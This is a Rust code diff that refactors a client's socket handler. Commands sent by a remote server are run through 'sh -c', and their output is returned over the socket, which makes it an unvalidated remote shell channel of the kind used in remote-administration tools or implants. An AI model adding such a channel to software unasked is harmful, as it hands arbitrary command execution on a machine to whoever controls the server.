@@ -1,5 +1,5 @@
 #![cfg_attr(debug_assertions, allow(dead_code, unused_imports))]
-use std::{str, collections::HashMap, error::Error, fmt::Display, path::Path, process::Stdio, sync::{mpsc::Sender, Arc}, time::Duration};
+use std::{collections::HashMap, error::Error, fmt::Display, path::Path, process::{Output, Stdio}, str, sync::{mpsc::Sender, Arc}, time::Duration};
 use log::{debug, info};
 use reqwest::{header::{HeaderValue, ACCEPT, CONTENT_TYPE, COOKIE}, Client};
 use reqwest_cookie_store::{CookieStore, CookieStoreMutex};
@@ -342,29 +342,7 @@ impl ComputerData{
                         // println!("{bin_payload:#?}");
                     },
                     Payload::String(string_payload) => {
-                        println!("string_payload: {}", string_payload.clone());
-                        if string_payload.contains("cd"){
-                            // TODO: need to find a way to keep track of current directory using this
-                            // std::env::set_current_dir(&path)
-                        }
-                        let command_payload = split(string_payload.as_str());
-                        let process = tokio::process::Command::new("sh")
-                            .arg("-c")
-                            .args(command_payload.unwrap())
-                            .stdout(Stdio::piped())
-                            .spawn()
-                            .unwrap()
-                            .wait_with_output()
-                            .await
-                            .unwrap();
-    
-                        let result: Vec<u8> = process.stdout;
-    
-                        client.emit(
-                        "clientCmdResponse", 
-                           json!({"message": String::from_utf8(result).unwrap()})
-                        ).await
-                        .unwrap();
+                       Self::handle_command_payload(string_payload, client).await;
                     }
                 }
             }.boxed())
@@ -414,6 +392,47 @@ impl ComputerData{
        
     }
     
+    async fn handle_command_payload(string_payload: String, client: SocketClient) {
+        println!("string_payload: {}", string_payload.clone());
+        if string_payload.contains("cd"){
+            // TODO: need to find a way to keep track of current directory using this
+            // std::env::set_current_dir(&path)
+        }
+        let command_payload = split(string_payload.as_str());
+        let process = tokio::process::Command::new("sh")
+            .arg("-c")
+            .args(command_payload.unwrap())
+            .stdout(Stdio::piped())
+            .spawn();
+            
+        match process{
+            Ok(child) => {
+                let output = child
+                    .wait_with_output()
+                    .await;
+                
+                match output{
+                    Ok(out) => {
+                        let result: Vec<u8> = out.stdout;
+
+                        let socket_emit = client.emit(
+                        "clientCmdResponse", 
+                        json!({"message": String::from_utf8(result).unwrap()})
+                        ).await;
+
+                        match socket_emit{
+                            Ok(_) => info!("Emit socket event successfully"),
+                            Err(e) => debug!("Error emitting socket event: {e:?}"),
+                        }
+                    },
+                    Err(e) => debug!("Error reading Output => {e:?}")
+                }
+            },
+            Err(err) =>{
+                debug!("Error in process => {err:?}");
+            },
+        }
+    }
     async fn get_sysinfo() -> SystemInformation {
         let mut sys = System::new_all();
         // First we update all information of our `System` struct.
